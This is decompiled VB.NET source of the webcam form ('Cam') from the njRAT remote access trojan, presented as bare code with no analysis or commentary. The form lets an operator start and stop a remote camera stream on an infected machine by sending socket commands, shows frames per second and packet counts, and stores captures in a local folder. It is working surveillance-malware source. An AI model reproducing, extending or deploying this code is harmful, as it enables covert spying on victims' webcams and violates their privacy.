Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000D RID: 13
	<DesignerGenerated()>
	Public Partial Class Cam
		Inherits Form

		' Token: 0x17000054 RID: 84
		' (get) Token: 0x060000BB RID: 187 RVA: 0x00007E63 File Offset: 0x00006063
		' (set) Token: 0x060000BC RID: 188 RVA: 0x00007E6D File Offset: 0x0000606D
		Friend Overridable Property Panel1 As Panel

		' Token: 0x17000055 RID: 85
		' (get) Token: 0x060000BD RID: 189 RVA: 0x00007E76 File Offset: 0x00006076
		' (set) Token: 0x060000BE RID: 190 RVA: 0x00007E80 File Offset: 0x00006080
		Friend Overridable Property ComboBox1 As ComboBox
			<CompilerGenerated()>
			Get
				Return Me._ComboBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox1_SelectedIndexChanged
				Dim comboBox As ComboBox = Me._ComboBox1
				If comboBox IsNot Nothing Then
					RemoveHandler comboBox.SelectedIndexChanged, value2
				End If
				Me._ComboBox1 = value
				comboBox = Me._ComboBox1
				If comboBox IsNot Nothing Then
					AddHandler comboBox.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000056 RID: 86
		' (get) Token: 0x060000BF RID: 191 RVA: 0x00007EC3 File Offset: 0x000060C3
		' (set) Token: 0x060000C0 RID: 192 RVA: 0x00007ED0 File Offset: 0x000060D0
		Friend Overridable Property CheckBox3 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox3
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				checkBox = Me._CheckBox3
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000057 RID: 87
		' (get) Token: 0x060000C1 RID: 193 RVA: 0x00007F13 File Offset: 0x00006113
		' (set) Token: 0x060000C2 RID: 194 RVA: 0x00007F20 File Offset: 0x00006120
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000058 RID: 88
		' (get) Token: 0x060000C3 RID: 195 RVA: 0x00007F63 File Offset: 0x00006163
		' (set) Token: 0x060000C4 RID: 196 RVA: 0x00007F70 File Offset: 0x00006170
		Friend Overridable Property ComboBox2 As ComboBox
			<CompilerGenerated()>
			Get
				Return Me._ComboBox2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox2_SelectedIndexChanged
				Dim comboBox As ComboBox = Me._ComboBox2
				If comboBox IsNot Nothing Then
					RemoveHandler comboBox.SelectedIndexChanged, value2
				End If
				Me._ComboBox2 = value
				comboBox = Me._ComboBox2
				If comboBox IsNot Nothing Then
					AddHandler comboBox.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000059 RID: 89
		' (get) Token: 0x060000C5 RID: 197 RVA: 0x00007FB3 File Offset: 0x000061B3
		' (set) Token: 0x060000C6 RID: 198 RVA: 0x00007FC0 File Offset: 0x000061C0
		Friend Overridable Property PictureBox1 As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._PictureBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As PaintEventHandler = AddressOf Me.PictureBox1_Paint
				Dim pictureBox As PictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					RemoveHandler pictureBox.Paint, value2
				End If
				Me._PictureBox1 = value
				pictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					AddHandler pictureBox.Paint, value2
				End If
			End Set
		End Property

		' Token: 0x1700005A RID: 90
		' (get) Token: 0x060000C7 RID: 199 RVA: 0x00008003 File Offset: 0x00006203
		' (set) Token: 0x060000C8 RID: 200 RVA: 0x0000800D File Offset: 0x0000620D
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x1700005B RID: 91
		' (get) Token: 0x060000C9 RID: 201 RVA: 0x00008016 File Offset: 0x00006216
		' (set) Token: 0x060000CA RID: 202 RVA: 0x00008020 File Offset: 0x00006220
		Friend Overridable Property vmethod_6 As Timer
			<CompilerGenerated()>
			Get
				Return Me._vmethod_6
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim vmethod_ As Timer = Me._vmethod_6
				If vmethod_ IsNot Nothing Then
					RemoveHandler vmethod_.Tick, value2
				End If
				Me._vmethod_6 = value
				vmethod_ = Me._vmethod_6
				If vmethod_ IsNot Nothing Then
					AddHandler vmethod_.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700005C RID: 92
		' (get) Token: 0x060000CB RID: 203 RVA: 0x00008063 File Offset: 0x00006263
		' (set) Token: 0x060000CC RID: 204 RVA: 0x00008070 File Offset: 0x00006270
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick_1
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x060000CD RID: 205 RVA: 0x000080B4 File Offset: 0x000062B4
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Cam_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Cam_Load
			Me.fps = 0
			Me.int_0 = 0
			Me.QQ = String.Empty
			Me.folder = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x060000CE RID: 206 RVA: 0x0000811C File Offset: 0x0000631C
		Private Sub Cam_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Dim cn As Boolean = Me.sk.CN
				If cn Then
					Me.sk.Send("@")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000CF RID: 207 RVA: 0x0000817C File Offset: 0x0000637C
		Private Sub Cam_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Me.QQ
				Me.ComboBox2.SelectedIndex = 3
				Me.vmethod_6.Enabled = True
				Me.folder = Me.osk.Folder + "Cam\"
				Dim flag As Boolean = Not Directory.Exists(Me.folder)
				If flag Then
					Directory.CreateDirectory(Me.folder)
				End If
				Try
					Me.ComboBox2.SelectedIndex = Class7.class8_0.int_0
				Catch ex As Exception
					Me.ComboBox2.SelectedIndex = 3
				End Try
				Dim bool_ As Boolean = Class7.class8_0.bool_7
				If bool_ Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				End If
			Catch ex2 As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060000D0 RID: 208 RVA: 0x00008314 File Offset: 0x00006514
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.vmethod_6.Enabled = False
			Try
				Dim flag As Boolean = Me.osk Is Nothing Or Me.sk Is Nothing
				If flag Then
					MyBase.Close()
					Return
				End If
				Dim flag2 As Boolean = Not Me.osk.CN Or Not Me.sk.CN
				If flag2 Then
					MyBase.Close()
				End If
			Catch ex As Exception
			End Try
			Me.int_0 = Me.fps
			Dim flag3 As Boolean = Me.int_0 = 0
			If flag3 Then
				Me.pkt = 0
				Me.PictureBox1.Invalidate()
			End If
			Me.fps = 0
			Me.vmethod_6.Enabled = True
		End Sub

		' Token: 0x060000D1 RID: 209 RVA: 0x000083E0 File Offset: 0x000065E0
		Private Sub PictureBox1_Paint(sender As Object, e As PaintEventArgs)
			Try
				Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(CLng(Me.pkt))
				Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(Brushes.Black, rect)
				Dim brush As Brush = Brushes.Red
				Dim flag As Boolean = Me.int_0 > 3
				If flag Then
					brush = Brushes.YellowGreen
				End If
				Dim flag2 As Boolean = Me.int_0 > 6
				If flag2 Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000D2 RID: 210 RVA: 0x000084C8 File Offset: 0x000066C8
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
				If flag Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				Else
					Me.Button1.Text = "Start"
					Me.sk.Send("@")
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000D3 RID: 211 RVA: 0x000085A0 File Offset: 0x000067A0
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.CheckBox3.Checked
			If checked Then
				Try
					Process.Start(Me.folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060000D4 RID: 212 RVA: 0x000085F0 File Offset: 0x000067F0
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem)) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x060000D5 RID: 213 RVA: 0x00008678 File Offset: 0x00006878
		Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem)) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x060000D6 RID: 214 RVA: 0x000086FD File Offset: 0x000068FD
		Private Sub Timer1_Tick_1(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x0400005B RID: 91
		Public folder As String

		' Token: 0x0400005C RID: 92
		Public fps As Integer

		' Token: 0x0400005D RID: 93
		Private int_0 As Integer

		' Token: 0x0400005E RID: 94
		Public osk As Client

		' Token: 0x0400005F RID: 95
		Public pkt As Integer

		' Token: 0x04000060 RID: 96
		Public QQ As String

		' Token: 0x04000061 RID: 97
		Public sk As Client
	End Class
End Namespace
